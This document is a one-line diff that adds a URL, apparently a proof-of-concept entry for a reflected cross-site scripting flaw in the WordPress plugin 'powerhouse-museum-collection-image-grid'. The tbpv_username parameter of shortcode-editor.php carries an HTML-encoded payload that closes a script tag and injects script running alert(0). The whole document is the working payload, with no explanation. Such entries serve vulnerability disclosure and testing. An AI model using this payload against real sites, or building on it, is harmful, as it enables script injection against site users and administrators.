@@ -1,0 +1,1 @@
+http://www.example.com/wordpress/wp-content/plugins/powerhouse-museum-collection-image-grid/shortcode-editor.php?tbpv_id=x&amp;tbpv_username=&lt;/script&gt;&lt;script&gt;alert(0)&lt;/script&gt;&amp;tbpv_domain=&amp;tbpv_login=
